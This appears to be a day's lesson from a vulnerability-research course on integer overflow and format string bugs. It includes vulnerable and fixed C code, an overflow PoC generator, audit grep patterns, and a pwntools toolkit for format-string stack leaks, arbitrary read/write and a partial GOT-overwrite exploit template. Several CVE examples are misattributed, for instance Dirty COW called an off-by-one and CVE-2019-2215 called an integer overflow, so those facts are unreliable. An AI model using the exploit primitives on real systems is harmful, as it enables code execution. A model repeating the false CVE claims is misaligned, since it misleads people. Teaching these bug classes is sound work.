---
title: "Bug Class Deep Dive — Integer Overflow and Format String"
tags: [vulnerability-research, bug-class, integer-overflow, format-string,
  CWE-190, CWE-134, truncation, sign-extension, module-10-vulnresearch-01]
module: 10-VulnResearch-01
day: 662
prerequisites:
  - Day 651 — Source Code Auditing
  - Day 656 — Patch Diffing and CVE Reproduction
related_topics:
  - Bug Class Deep Dive — Memory Safety (Day 663)
  - Vulnerability Research Sprint Day 1 (Day 664)
---

# Day 662 — Bug Class Deep Dive: Integer Overflow and Format String

> "Integer overflows are silent killers. The program does not crash. No
> exception is thrown. The computation wraps or truncates, and the resulting
> wrong value flows silently into a length check, a buffer allocation, or
> a loop counter — and then the real bug happens downstream. The overflow
> is not the vulnerability. It is the trigger. Finding the overflow is step
> one. Tracing its effect is the actual work."
>
> — Ghost

---

## Goals

Understand the mechanics of integer overflow, truncation, and sign extension.
Understand format string vulnerabilities from first principles. Write PoCs
for both bug classes. Learn to recognise them in source code and patch diffs.
Understand the detection and fix for each.

**Prerequisites:** Days 651, 656.
**Estimated study time:** 4 hours.

---

## Bug Class 1 — Integer Overflow (CWE-190)

### What it is

An integer arithmetic operation produces a result that cannot be represented
by the integer type, wrapping around to an unexpected value.

```c
/*
 * EXAMPLE: Signed integer overflow — undefined behaviour in C
 *
 * The vulnerable pattern: size calculation that can wrap
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* VULNERABLE FUNCTION: allocates a 2D buffer for (rows × cols) elements */
char *alloc_matrix(size_t rows, size_t cols) {
    size_t total = rows * cols;   /* VULNERABLE: can overflow if rows * cols > SIZE_MAX */
    return malloc(total);         /* malloc(0) returns non-NULL; malloc(small) = too small */
}

/* REAL ATTACK:
 *   alloc_matrix(0x40000001, 4) → total = 0x100000004 → wraps to 4 (on 32-bit)
 *   malloc(4) → allocates 4 bytes
 *   Later: write 0x40000001 * 4 bytes → heap overflow
 *
 * CVE-2019-2215 (Android Binder) exploited this exact class of bug.
 * CVE-2021-3156 (sudo) was partly triggered by an integer overflow in argv parsing.
 */

/* CORRECT FIX: check before multiplying */
char *alloc_matrix_safe(size_t rows, size_t cols) {
    if (rows != 0 && cols > SIZE_MAX / rows) {
        return NULL;  /* Overflow would occur — refuse the allocation */
    }
    size_t total = rows * cols;
    return malloc(total);
}
```

```python
#!/usr/bin/env python3
"""
Integer overflow taxonomy — all the ways integer arithmetic can go wrong in C.
"""
from __future__ import annotations

INTEGER_BUG_CLASSES = {
    "unsigned_wraparound": {
        "cwe": "CWE-190",
        "what": "Unsigned integer wraps from max to 0 (defined behaviour in C, but logically wrong)",
        "example_c": "uint32_t x = UINT32_MAX; x += 1; /* x == 0 */",
        "real_world": "CVE-2018-11776 (Apache Struts): size calculation wraps → heap underflow",
        "grep_pattern": r"(size_t|uint32_t|uint16_t|unsigned)\s+\w+\s*=.*\*.*",
        "detect_patch": "Check addition added before multiply: 'if (a > MAXVAL / b)'",
    },
    "signed_overflow": {
        "cwe": "CWE-190",
        "what": "Signed integer overflow is UNDEFINED BEHAVIOUR in C — compiler may optimize it away",
        "example_c": "int x = INT_MAX; x += 1; /* UB — may NOT wrap */",
        "real_world": "Many Linux kernel bugs — compiler eliminates overflow check as UB",
        "grep_pattern": r"(int|ssize_t)\s+\w+\s*=.*\*.*",
        "detect_patch": "Use __builtin_add_overflow() or cast to uint first",
    },
    "truncation": {
        "cwe": "CWE-197",
        "what": "Value is assigned to a smaller type, silently losing high bits",
        "example_c": "int len = get_length();  /* returns 65536 */\nuint8_t small_len = len;  /* small_len == 0 */\nif (small_len > MAX) { reject(); }  /* 0 passes — bug! */",
        "real_world": "CVE-2021-30481 (Steam): uint8_t truncation of packet length field",
        "grep_pattern": r"(uint8_t|uint16_t|char)\s+\w+\s*=\s*(int|long|size_t)",
        "detect_patch": "Check added: 'if (len > UINT8_MAX) { return ERROR; }'",
    },
    "sign_extension": {
        "cwe": "CWE-195",
        "what": "Signed char/short is sign-extended to int when converted, producing large value",
        "example_c": "char c = -1;  /* 0xFF */\nsize_t idx = (size_t)c;  /* idx = 0xFFFFFFFFFFFFFFFF */\nbuf[idx] = 0;  /* writes to address -1 relative to buf */",
        "real_world": "OpenSSH CRC32 compensation attack (2001) — sign extension bug",
        "grep_pattern": r"(size_t|unsigned)\s+\w+\s*=\s*\(.*\)(char|int8_t|short)",
        "detect_patch": "Cast to unsigned type first: (size_t)(uint8_t)c",
    },
    "off_by_one": {
        "cwe": "CWE-193",
        "what": "Loop or index is one too large or one too small — accesses one element past end",
        "example_c": "for (int i = 0; i <= len; i++) { buf[i] = 0; }  /* writes buf[len] */",
        "real_world": "CVE-2016-5195 (Dirty COW) — off-by-one in memory mapping logic",
        "grep_pattern": r"for\s*\(.*;\s*\w+\s*<=\s*\w+;\s*",
        "detect_patch": "'<=' changed to '<', or len changed to len-1",
    },
}

print("[*] INTEGER BUG TAXONOMY")
for bug_class, info in INTEGER_BUG_CLASSES.items():
    print(f"\n  [{bug_class.upper()}] — {info['cwe']}")
    print(f"    What: {info['what'][:80]}")
    print(f"    Real-world: {info['real_world'][:70]}")
    print(f"    Grep: {info['grep_pattern']}")
```

```python
#!/usr/bin/env python3
"""
Integer overflow PoC toolkit — minimal reproducers for each class.
Run these in Python first to understand the mechanics; replicate in C to exploit.
"""
from __future__ import annotations

import struct
import ctypes


def demo_unsigned_wraparound() -> None:
    """Simulate 32-bit unsigned wraparound."""
    max_uint32 = 0xFFFFFFFF
    result = (max_uint32 + 1) & 0xFFFFFFFF  # Python integers don't wrap; force it
    print(f"[*] Unsigned wraparound: UINT32_MAX + 1 = {result} (expected 0)")

    # Real attack vector: size = n * element_size
    # n = 0x40000001, element_size = 4
    n = 0x40000001
    element_size = 4
    wrapped = (n * element_size) & 0xFFFFFFFF
    print(f"[*] Size calculation: {n:#x} * {element_size} = {wrapped:#x} (tiny alloc!)")
    print(f"    malloc({wrapped}) allocates {wrapped} bytes, but {n * element_size} are written")


def demo_truncation() -> None:
    """Simulate 16→8 bit truncation."""
    large_len = 0x0101  # 257 decimal
    truncated = large_len & 0xFF  # truncate to 8-bit
    print(f"\n[*] Truncation: 0x{large_len:04X} (257) truncated to uint8_t = {truncated} (1)")
    print(f"    if (truncated > 256) reject(); → 1 > 256 is FALSE → attack input accepted!")


def demo_sign_extension() -> None:
    """Simulate signed char → size_t sign extension."""
    signed_char_val = -1  # 0xFF as int8_t
    # Sign extension: when (size_t)(int8_t)(-1) = 0xFFFFFFFFFFFFFFFF
    as_uint64 = ctypes.c_uint64(ctypes.c_int8(signed_char_val).value).value
    print(f"\n[*] Sign extension: (size_t)(char)(-1) = {as_uint64:#x}")
    print(f"    This is {as_uint64} — used as index = buffer[-1] read/write!")


def craft_integer_overflow_poc(output_file: str = "int_overflow_poc.bin") -> None:
    """
    Craft a binary input that triggers an integer overflow via size field.
    Target: alloc_matrix(rows, cols) where rows * cols overflows uint32_t.
    """
    # On a 32-bit system: 0x40000001 * 4 = 0x100000004 → truncates to 0x4 → malloc(4)
    rows = 0x40000001
    cols = 4
    # This payload makes the target allocate 4 bytes but expect to write rows*cols
    poc = struct.pack("<I", rows)   # rows field
    poc += struct.pack("<I", cols)  # cols field
    poc += b"A" * (rows * cols)    # payload — would overflow the 4-byte allocation

    # In practice: just need rows + cols in the file; the overflow happens server-side
    minimal_poc = struct.pack("<I", rows) + struct.pack("<I", cols)
    with open(output_file, "wb") as f:
        f.write(minimal_poc)
    print(f"\n[*] Integer overflow PoC written to {output_file}")
    print(f"    Triggers alloc_matrix({rows:#x}, {cols}) → malloc({(rows * cols) & 0xFFFFFFFF:#x})")


if __name__ == "__main__":
    demo_unsigned_wraparound()
    demo_truncation()
    demo_sign_extension()
    craft_integer_overflow_poc()
```

---

## Bug Class 2 — Format String (CWE-134)

### What it is

User-controlled data is used directly as the format string argument to `printf`
family functions, allowing the attacker to read stack memory with `%x` or
write to arbitrary addresses with `%n`.

```c
/*
 * FORMAT STRING VULNERABILITY — from first principles
 */

#include <stdio.h>

/* VULNERABLE */
void log_message_bad(const char *user_input) {
    printf(user_input);     /* VULNERABLE: user_input IS the format string */
}

/* SAFE */
void log_message_good(const char *user_input) {
    printf("%s", user_input);   /* SAFE: user_input is treated as a plain string */
}

/*
 * WHY IT WORKS:
 *
 * printf("Hello %s %d", name, age) reads TWO arguments from the stack.
 * If user provides: printf("%x %x %x %x %x %x %x %x")
 * ... printf reads EIGHT values from the stack — whatever is there.
 *
 * Stack at printf() call:
 *   [return addr] [format_str_ptr] [arg1] [arg2] [arg3] ...
 *
 * With no format args provided:
 *   %x reads arg1 (which is whatever is on the stack — stack data leak!)
 *   %x %x %x reads three stack words
 *   %n WRITES the number of characters printed to the address in arg1
 *
 * PRIMITIVE CAPABILITIES:
 *   %x, %p, %d     → read stack values (information disclosure)
 *   %s              → dereference a stack address as a string pointer (crash or leak)
 *   %n              → write to an attacker-controlled address (arbitrary write)
 *   %<N>$x          → read the Nth argument directly (direct parameter access)
 *   %<N>$n          → write to the address at position N on the stack
 *
 * MODERN MITIGATIONS:
 *   GCC -Wformat: warns when format string is not a string literal
 *   FORTIFY_SOURCE: _chk wrappers detect %n with non-literal format
 *   Most modern compilers: error on printf(variable_str)
 *   But: still present in legacy code, embedded systems, CTF challenges
 */
```

```python
#!/usr/bin/env python3
"""
Format string exploitation primitives — read and write using format specifiers.
Use this in CTF environments against vulnerable binaries.
"""
from __future__ import annotations

from pwn import (
    ELF,
    context,
    cyclic,
    flat,
    log,
    p32,
    p64,
    process,
    remote,
    u32,
    u64,
)


def leak_stack_values(io, count: int = 20) -> list[int]:
    """
    Use %x format specifiers to dump stack values.
    Returns a list of leaked integers.
    """
    # Build format string: %1$x.%2$x. ... %N$x (direct parameter access)
    fmt = ".".join(f"%{i}$x" for i in range(1, count + 1))
    io.sendline(fmt.encode())
    response = io.recvline().strip().decode()

    # Parse the leaked hex values
    values = []
    for part in response.split("."):
        try:
            values.append(int(part, 16))
        except ValueError:
            values.append(0)
    return values


def find_format_string_offset(io) -> int:
    """
    Find which stack position holds our input buffer.
    Send a marker (0xDEADBEEF pattern) and look for it in the leak.
    """
    marker = 0xDEADBEEF
    for i in range(1, 30):
        payload = p32(marker).decode("latin-1") + f"%{i}$x"
        io.sendline(payload.encode())
        response = io.recvline().strip().decode()
        if "deadbeef" in response.lower():
            log.success(f"[*] Buffer is at position {i} on the stack")
            return i
    raise RuntimeError("Could not find buffer offset")


def arbitrary_read(io, addr: int, offset: int) -> int:
    """
    Read 8 bytes from an arbitrary address using %s.
    offset: the stack position where our buffer appears.
    """
    # Place the target address in our buffer at the start,
    # then use %offset$s to dereference it as a char*
    payload = p64(addr) + f"%{offset}$s".encode()
    io.sendline(payload)
    # The data at addr is printed as a string — read until null byte
    leaked = io.recvuntil(b"\x00", drop=True)
    return int.from_bytes(leaked[:8].ljust(8, b"\x00"), "little")


def arbitrary_write_short(io, addr: int, value: int, offset: int) -> None:
    """
    Write a 2-byte (short) value to an arbitrary address using %hn.
    Splits the write into high and low 16-bit halves.
    """
    low  = value & 0xFFFF
    high = (value >> 16) & 0xFFFF

    # Write low half first, then high half
    payload = p64(addr)                          # destination address for low write
    payload += p64(addr + 2)                     # destination address for high write
    # %<low>c outputs 'low' characters, then %<offset>$hn writes the count (low) to addr
    payload += f"%{low}c%{offset}$hn".encode()
    diff = (high - low) & 0xFFFF
    payload += f"%{diff}c%{offset + 1}$hn".encode()

    io.sendline(payload)
    io.recvline()  # consume output
    log.success(f"Wrote {value:#x} to {addr:#x}")


# Example: finding and exploiting a format string in a CTF binary
def exploit_format_string_ctf(binary_path: str) -> None:
    """
    Minimal format string exploit template for a CTF binary.
    Assumes: binary prints user input back via printf(buf) without format arg.
    Goal: overwrite a GOT entry to redirect execution.
    """
    elf = ELF(binary_path)
    context.binary = elf
    context.log_level = "debug"

    io = process(binary_path)

    # Step 1: Find stack offset
    offset = find_format_string_offset(io)
    log.info(f"Buffer at stack offset: {offset}")

    # Step 2: Leak a libc address to defeat ASLR
    printf_got = elf.got["printf"]
    leaked_printf = arbitrary_read(io, printf_got, offset)
    log.info(f"Leaked printf@GOT: {leaked_printf:#x}")

    # Step 3: Calculate libc base (requires libc version detection)
    # libc_base = leaked_printf - libc.symbols["printf"]
    # system_addr = libc_base + libc.symbols["system"]

    # Step 4: Overwrite printf GOT with system address
    # arbitrary_write_short(io, printf_got, system_addr, offset)

    # Step 5: Send "/bin/sh" — now calls system("/bin/sh")
    # io.sendline(b"/bin/sh")
    # io.interactive()

    io.close()
    log.warning("Fill in libc resolution to complete the exploit")


if __name__ == "__main__":
    # This runs as a demo — supply an actual vulnerable binary path
    log.info("Format string primitives loaded")
    log.info("Usage: replace exploit_format_string_ctf() target with your binary")
```

---

## Stage 3 — Recognising Both Bug Classes in Code Review

```python
#!/usr/bin/env python3
"""
Quick-reference: what to look for in source code for each bug class.
"""
from __future__ import annotations

AUDIT_PATTERNS = {
    "integer_overflow_triggers": {
        "allocations": [
            "malloc(a * b)                  ← multiply before check",
            "malloc(a + b)                  ← add before check",
            "calloc(n, size) with n from user ← but n * size can overflow",
            "alloca(user_len)               ← stack allocation of user-controlled size",
        ],
        "loop_bounds": [
            "for (i = 0; i < user_count * 4; i++) ← overflow in bound",
            "while (remaining > 0) { remaining -= chunk; } ← underflow if chunk > remaining",
        ],
        "comparisons": [
            "if (len < MAX) { use_buffer(buf, len); } with len as int (signed)",
            "uint8_t result = big_int_function();  ← truncation before compare",
        ],
    },
    "format_string_triggers": {
        "printf_family": [
            "printf(user_buf)          ← user_buf IS the format string",
            "fprintf(fp, user_msg)     ← same pattern",
            "syslog(LOG_ERR, msg)      ← syslog uses printf-style format",
            "sprintf(dst, user_fmt)    ← double danger: format string + overflow",
            "err(1, user_msg)          ← err() family is vulnerable",
        ],
        "logging_functions": [
            "log_message(user_input)   ← custom logger may call printf internally",
            "vsprintf(buf, user_fmt, args) ← variadic version, same issue",
        ],
    },
    "detection_grep_commands": [
        "grep -rn 'printf(' src/ | grep -v '\"'",      # printf without string literal
        "grep -rn 'sprintf(' src/ | grep -v 'sizeof'", # sprintf without size
        r"grep -rn '\* [a-z]' src/ --include='*.c'",  # multiplication in expression
        "grep -rn 'malloc(' src/ | grep '[+*]'",       # malloc with arithmetic
        "grep -rn 'uint8_t.*=.*(int\\|long\\|size_t)' src/",  # truncation pattern
    ],
}

print("[*] AUDIT QUICK-REFERENCE")
for category, patterns in AUDIT_PATTERNS.items():
    print(f"\n  [{category.upper()}]")
    if isinstance(patterns, dict):
        for subcat, items in patterns.items():
            print(f"  {subcat}:")
            for item in items[:3]:
                print(f"    → {item}")
    elif isinstance(patterns, list):
        for item in patterns:
            print(f"    $ {item}")
```

---

## Key Takeaways

1. **Integer overflows are invisible at the bug site.** The `rows * cols` computation
   does not crash. There is no error. The wrong value propagates silently downstream
   into `malloc()`, and the crash — or the exploitation — happens bytes later when the
   undersized allocation is written past. When hunting integer overflows, trace forward
   from the arithmetic to its downstream use, not just the arithmetic itself.
2. **Truncation is the most commonly overlooked integer bug.** A function returns an
   `int` — the value fits fine. Then someone assigns it to a `uint8_t` or `uint16_t`
   because "the value should be small". The attacker provides a value that is small
   after truncation but large before: `0x0101` truncates to `0x01`, bypassing an
   `if (val > 1) { reject(); }` check. Always audit type changes at assignment.
3. **Format string is about what you can do with `%n`, not just `%x`.** Reading stack
   data with `%x` is interesting for information disclosure and ASLR bypass. Writing
   to arbitrary addresses with `%n` is the exploit primitive. The fix is always the
   same — one line of code: add `"%s"` as the explicit format argument. Any code that
   does not do this is wrong, regardless of whether the input appears controlled.
4. **Format string vulnerabilities are rare in new code but still present in legacy
   systems.** Modern compilers warn or error on non-literal format strings. But
   embedded firmware, older C daemons, and custom logging frameworks still contain
   this class. Patch diffing old CVEs in projects like Samba, wu-ftpd, or glibc
   reveals classic format string exploitation chains. Know them; you will see them
   in CTFs and old binaries forever.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q662.1, Q662.2 …).

---

## Navigation

← Previous: [Day 661 — Advanced Fuzzing: Grammar-Based and Protocol Fuzzing](DAY-0661-Advanced-Fuzzing-Grammar-Protocol.md)
→ Next: [Day 663 — Bug Class Deep Dive: Memory Safety — UAF and Heap Corruption](DAY-0663-Bug-Class-UAF-Heap-Corruption.md)
